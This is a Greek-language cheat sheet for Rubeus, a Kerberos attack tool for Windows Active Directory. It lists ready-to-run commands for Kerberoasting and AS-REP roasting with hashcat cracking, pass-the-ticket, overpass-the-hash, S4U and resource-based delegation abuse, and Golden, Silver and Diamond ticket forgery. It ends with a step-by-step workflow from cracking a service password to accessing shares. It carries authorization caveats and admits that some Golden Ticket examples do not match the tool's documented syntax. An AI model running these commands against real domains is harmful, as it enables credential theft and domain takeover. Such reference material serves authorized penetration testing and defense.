# 🎫 Rubeus — Εργαλεία αλληλεπίδρασης και ελέγχων Kerberos

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Αλληλεπίδραση και έλεγχοι Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## Πριν ξεκινήσετε

Το **Rubeus** είναι εργαλείο C# για αλληλεπίδραση με Kerberos σε Windows. Εξετάζει και χειρίζεται tickets, αιτήματα ταυτοποίησης και σενάρια ανάθεσης. Ο οδηγός προϋποθέτει ήδη επιτρεπόμενη πρόσβαση και τα κατάλληλα κλειδιά ή δικαιώματα για κάθε λειτουργία.

**Βασικοί όροι:** *TGT* = Ticket Granting Ticket για αίτημα άλλων tickets, *TGS/service ticket* = ticket προς υπηρεσία, *SPN* = αναγνωριστικό υπηρεσίας, *LUID* = αναγνωριστικό συνεδρίας σύνδεσης Windows, *kirbi/Base64* = τρόποι αποθήκευσης ή μεταφοράς δεδομένων ticket, *delegation* = ανάθεση ταυτοποίησης.

Αποτύπωμα NT, κλειδί AES, ticket και καταγραφή NetNTLMv2 δεν είναι εναλλάξιμα. Ο τύπος κρυπτογράφησης, η λήξη, η συνεδρία και η πολιτική του domain επηρεάζουν αν γίνεται αποδεκτό ένα αίτημα. Οι αρχικές εντολές διατηρούνται με σημειώσεις για τη σωστή ερμηνεία.

## 📋 Περιεχόμενα

- [🎯 Τι είναι το Rubeus](#section-01)
- [🚀 Βασική χρήση](#section-02)
- [🎟️ Λειτουργίες tickets](#section-03)
- [🍖 Kerberoasting — έλεγχος αντοχής κωδικών υπηρεσιών](#section-04)
- [🔓 AS-REP Roasting — δεδομένα από λογαριασμούς χωρίς preauthentication](#section-05)
- [🎭 Έλεγχοι χρήσης και δημιουργίας tickets](#section-06)
- [🔀 Έλεγχοι ανάθεσης ταυτοποίησης (delegation)](#section-07)
- [✨ Golden και Silver Tickets](#section-08)
- [📊 Γρήγορη αναφορά](#section-09)
- [📚 Πηγές](#section-10)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Rubeus

Το **Rubeus** είναι εργαλείο C# για αλληλεπίδραση με Kerberos και ελέγχους διαχείρισης tickets:

- 🎫 **Λειτουργίες tickets** — αιτήματα, ανανέωση και περιγραφή
- 🔓 **Kerberoasting** — συλλογή κατάλληλων δεδομένων ticket για έλεγχο υποψήφιων κωδικών
- 🔑 **AS-REP Roasting** — έλεγχος λογαριασμών χωρίς απαίτηση προταυτοποίησης
- 🎭 **Pass-the-Ticket** — χρήση διαθέσιμων tickets σε επιτρεπόμενο έλεγχο
- ✨ **Golden/Silver Tickets** — δημιουργία tickets με κατάλληλα ήδη διαθέσιμα κλειδιά

---

<a id="section-02"></a>

## 🚀 Βασική χρήση

> **Εκτέλεση και φόρτωση:** Το execute-assembly είναι λειτουργία συγκεκριμένου περιβάλλοντος, όχι αυτόνομη εντολή PowerShell. Το Assembly.LoadFile φορτώνει assembly αλλά δεν εκκινεί από μόνο του το entry point του Rubeus. Τα παραδείγματα προϋποθέτουν συμβατό περιβάλλον .NET και δικαιώματα.


### Εκτέλεση Rubeus

```powershell
# Άμεση εκτέλεση
.\Rubeus.exe <command> [options]

# Παράδειγμα εκτέλεσης μέσω λειτουργίας Cobalt Strike
execute-assembly Rubeus.exe <command>

# Φόρτωση assembly μέσω PowerShell· δεν εκτελεί μόνη της όλες τις λειτουργίες του εργαλείου
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="section-03"></a>

## 🎟️ Λειτουργίες tickets

### Αίτημα Ticket Granting Ticket (TGT)

```powershell
# Με κωδικό πρόσβασης
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Με αποτύπωμα NT
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Με κλειδί AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Με κατάλληλο πιστοποιητικό και ιδιωτικό κλειδί
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Αποθήκευση σε αρχείο
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Αίτημα ticket υπηρεσίας (TGS)

```powershell
# Αίτημα ticket υπηρεσίας
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Με TGT από αρχείο
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Καταγραφή tickets

> **Η συνεδρία έχει σημασία:** Το LUID 0x3e7 επιλέγει συγκεκριμένη συνεδρία και δεν ισοδυναμεί με αυτόματη εμφάνιση όλων των tickets. Η ανάγνωση ή εισαγωγή ticket σε άλλη συνεδρία απαιτεί κατάλληλα δικαιώματα. Το createnetonly δημιουργεί νέο LUID που πρέπει να ληφθεί από το πραγματικό αποτέλεσμα.


```powershell
# Καταγραφή διαθέσιμων tickets τρέχοντος χρήστη
.\Rubeus.exe triage

# Παράδειγμα επιλογής συγκεκριμένης συνεδρίας LUID· δεν σημαίνει αυτόματα όλα τα tickets
.\Rubeus.exe triage /luid:0x3e7

# Αναλυτική εξαγωγή διαθέσιμων tickets
.\Rubeus.exe dump
```

### Pass-the-Ticket — χρήση διαθέσιμου ticket Kerberos

```powershell
# Εισαγωγή ticket στην τρέχουσα συνεδρία
.\Rubeus.exe ptt /ticket:base64ticket

# Εισαγωγή από αρχείο
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Δημιουργία νέας συνεδρίας και εισαγωγή ticket στο σωστό LUID
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Περιγραφή ticket

```powershell
# Προβολή στοιχείων ticket
.\Rubeus.exe describe /ticket:base64ticket

# Από αρχείο
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="section-04"></a>

## 🍖 Kerberoasting — έλεγχος αντοχής κωδικών υπηρεσιών

> **Κρυπτογράφηση και αποτέλεσμα:** AES, RC4 και επιλογές rc4opsec δεν σημαίνουν αυτόματα αφάνεια ή καθολική υποβάθμιση. Η μορφή ticket πρέπει να συμφωνεί με τον επιλεγμένο τρόπο ελέγχου υποψήφιων κωδικών. Ένα SPN δεν αποδεικνύει αδύναμο κωδικό. Πηγή: [επίσημο Rubeus](https://github.com/GhostPack/Rubeus).


### Βασικός έλεγχος Kerberoasting

```powershell
# Έλεγχος λογαριασμών SPN που καλύπτει η συγκεκριμένη λειτουργία
.\Rubeus.exe kerberoast

# Αποθήκευση σε αρχείο μορφής Hashcat
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Επιλογή συγκεκριμένου χρήστη
.\Rubeus.exe kerberoast /user:sqlservice

# Επιλογή rc4opsec του πρωτοτύπου· δεν εγγυάται καθολική υποβάθμιση σε etype 23
.\Rubeus.exe kerberoast /rc4opsec
```

### Πρόσθετες επιλογές Kerberoasting

```powershell
# Με συγκεκριμένο TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# Μόνο στατιστικά, χωρίς αιτήματα tickets της αντίστοιχης λειτουργίας
.\Rubeus.exe kerberoast /stats

# Επιλογή συγκεκριμένου SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Χρήση AES όπου υποστηρίζεται· δεν εγγυάται αφάνεια
.\Rubeus.exe kerberoast /aes

# Επιλογή χρήστη
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Έλεγχος υποψήφιων κωδικών σε δεδομένα Kerberoasting

```bash
# Hashcat με λειτουργία 13100 για τον αντίστοιχο τύπο Kerberoast
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="section-05"></a>

## 🔓 AS-REP Roasting — δεδομένα από λογαριασμούς χωρίς preauthentication

### Βασικός έλεγχος AS-REP roasting

```powershell
# Αναζήτηση και αίτημα δεδομένων λογαριασμών χωρίς προταυτοποίηση
.\Rubeus.exe asreproast

# Αποθήκευση σε αρχείο
.\Rubeus.exe asreproast /outfile:asrep.txt

# Επιλογή συγκεκριμένου χρήστη
.\Rubeus.exe asreproast /user:targetuser

# Μορφή Hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### Έλεγχος υποψήφιων κωδικών σε δεδομένα AS-REP

```bash
# Hashcat με λειτουργία 18200 για τον αντίστοιχο τύπο AS-REP
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="section-06"></a>

## 🎭 Έλεγχοι χρήσης και δημιουργίας tickets

### Overpass-the-Hash / Pass-the-Key

```powershell
# Αίτημα TGT με κλειδί και εισαγωγή σύμφωνα με το επιλεγμένο περιβάλλον συνεδρίας
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Με κλειδί AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Δημιουργία ξεχωριστής διεργασίας και συνεδρίας του παραδείγματος
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U — λειτουργίες Service for User

```powershell
# S4U2Self — αίτημα ticket για χρήστη προς την ίδια υπηρεσία
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy — αίτημα ticket προς άλλη υπηρεσία με τις απαιτούμενες άδειες
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Συνδυασμός βημάτων του συγκεκριμένου σεναρίου
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="section-07"></a>

## 🔀 Έλεγχοι ανάθεσης ταυτοποίησης (delegation)

> **Προϋποθέσεις ανάθεσης:** S4U, unconstrained και constrained/RBCD είναι διαφορετικά σενάρια. Χρειάζονται σωστά κλειδιά, επιτρεπόμενα SPN, ρυθμίσεις και χρήστες που μπορούν να γίνουν delegated. Monitor/harvest βλέπουν μόνο όσα επιτρέπουν το περιβάλλον, η συνεδρία και τα δικαιώματα.


### Μη περιορισμένη ανάθεση ταυτοποίησης

```powershell
# Παρακολούθηση TGT στο σύστημα με αντίστοιχη ανάθεση και δικαιώματα
.\Rubeus.exe monitor /interval:5 /nowrap

# Συγκεκριμένο φίλτρο
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Επαναλαμβανόμενη συλλογή διαθέσιμων TGT
.\Rubeus.exe harvest /interval:30
```

### Περιορισμένη ανάθεση ταυτοποίησης

```powershell
# Αίτημα ticket προς επιτρεπόμενη υπηρεσία
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Περιορισμένη ανάθεση βάσει πόρου

```powershell
# Μετά από κατάλληλη ρύθμιση RBCD μέσω PowerMad ή PowerView
# Αίτημα ticket με λογαριασμό υπολογιστή του εργαστηριακού σεναρίου
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="section-08"></a>

## ✨ Golden και Silver Tickets

> **Σύνταξη και έλεγχοι tickets:** Τα /krbtgt παραδείγματα Golden Ticket δεν αντιστοιχούν στην τεκμηριωμένη σύνταξη Rubeus που δέχεται κλειδί μέσω αντίστοιχης επιλογής κρυπτογράφησης. Τα Silver/Diamond δείγματα χρειάζονται επίσης έλεγχο απαιτούμενων ορισμάτων και παραμέτρων. Η ύπαρξη LDAP ticket δεν παρέχει από μόνη της DCSync. Σύγχρονοι έλεγχοι KDC/PAC επηρεάζουν την αποδοχή.


### Golden Ticket — πλαστογράφηση ticket με κλειδί krbtgt

```powershell
# Παράδειγμα Golden Ticket που απαιτεί κατάλληλο κλειδί krbtgt και συμβατή σύνταξη
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Καθορισμός ομάδων
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Με κλειδί AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket — πλαστογράφηση ticket υπηρεσίας

```powershell
# Παράδειγμα Silver Ticket με κατάλληλο κλειδί λογαριασμού υπηρεσίας
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Ticket υπηρεσίας LDAP του παραδείγματος· δεν δίνει αυτόματα DCSync
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket — τροποποίηση κατάλληλου πραγματικού TGT

```powershell
# Τροποποίηση πραγματικού TGT με τις απαιτούμενες προϋποθέσεις
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="section-09"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
|---------|-------------|
| `asktgt` | Αίτημα Ticket Granting Ticket (TGT) |
| `asktgs` | Αίτημα ticket υπηρεσίας (TGS) |
| `kerberoast` | Εξαγωγή κρυπτογραφημένων δεδομένων ticket για έλεγχο υποψήφιων κωδικών |
| `asreproast` | Έλεγχος AS-REP roasting |
| `ptt` | Pass-the-Ticket — χρήση διαθέσιμου ticket Kerberos |
| `s4u` | Service for User — ανάθεση ταυτοποίησης χρήστη |
| `golden` | Δημιουργία Golden Ticket |
| `silver` | Δημιουργία Silver Ticket |
| `dump` | Εξαγωγή διαθέσιμων tickets, ανά δικαιώματα |
| `triage` | Καταγραφή tickets |

### Επιλογές ταυτοποίησης

| Επιλογή | Περιγραφή |
|--------|-------------|
| `/user:` | Όνομα χρήστη |
| `/password:` | Κωδικοί πρόσβασης |
| `/rc4:` | Σύνοψη κωδικού NTLM (hash) |
| `/aes256:` | Κλειδί AES256 |
| `/ticket:` | Ticket σε Base64 ή υποστηριζόμενο αρχείο, ανά λειτουργία |

### Συνηθισμένες επιλογές

| Επιλογή | Περιγραφή |
|--------|-------------|
| `/ptt` | Pass-the-Ticket — χρήση διαθέσιμου ticket Kerberos |
| `/outfile:` | Αποθήκευση σε αρχείο |
| `/nowrap` | Χωρίς αναδίπλωση της εξόδου Base64 |
| `/domain:` | Όνομα τομέα στόχου |
| `/dc:` | Ελεγκτής τομέα (Domain Controller) |

### Ροή εργασίας ελέγχου

```powershell
# 1. Έλεγχος Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Έλεγχος υποψήφιων κωδικών
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Αίτημα TGT με διαθέσιμο κωδικό υπηρεσίας
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Εναλλακτικά, χρήση διαθέσιμου κλειδιού για αίτημα ticket
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Έλεγχος επιτρεπόμενης πρόσβασης σε πόρους
dir \\server\share
```

---

<a id="section-10"></a>

## 📚 Πηγές

- [Κώδικας Rubeus στο GitHub](https://github.com/GhostPack/Rubeus)
- [Ιστολόγιο HarmJ0y](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Σχετικοί οδηγοί
- [BloodHound](../../BloodHound/translations/README.el.md)
- [Impacket](../../Impacket/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

<p align="center">
  <b>🎫 Κατανοήστε τα tickets Kerberos!</b><br>
  <i>Rubeus — αλληλεπίδραση και έλεγχοι Kerberos</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
